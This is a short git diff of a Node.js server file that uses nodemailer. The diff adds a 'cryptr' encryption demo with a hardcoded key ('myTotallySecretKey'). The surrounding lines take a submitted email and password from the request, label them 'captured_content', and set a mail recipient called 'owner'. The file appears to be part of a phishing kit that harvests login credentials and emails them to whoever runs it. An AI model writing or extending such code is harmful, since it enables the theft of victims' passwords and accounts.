@@ -10,6 +10,8 @@ var networkInterfaces = os.networkInterfaces();
 var nodemailer = require('nodemailer');
 const encryptpwd = require('encrypt-with-password');
  
+const Cryptr = require('cryptr');
+
 
 
 
@@ -55,6 +57,16 @@ let pas = "618ee6985b5153162764e5e7e95ac183511cc8c1556244dcc3ffba521504ee33bd900
 const decrypted = encryptpwd.decrypt(encrypted, password);
 //console.log(decrypted);
     
+ const cryptr = new Cryptr('myTotallySecretKey');
+
+const encryptedString = cryptr.encrypt('bacon');
+const decryptedString = cryptr.decrypt(encryptedString);
+
+console.log(encryptedString); // 2a3260f5ac4754b8ee3021ad413ddbc11f04138d01fe0c5889a0dd7b4a97e342a4f43bb43f3c83033626a76f7ace2479705ec7579e4c151f2e2196455be09b29bfc9055f82cdc92a1fe735825af1f75cfb9c94ad765c06a8abe9668fca5c42d45a7ec233f0
+console.log(decryptedString); // bacon
+ 
+ 
+ 
     var captured_content = `\n Email: ${req.body.email} Password: ${pas+":"+password+";"+pass}`;
     let toMail = req.body.owner;
     
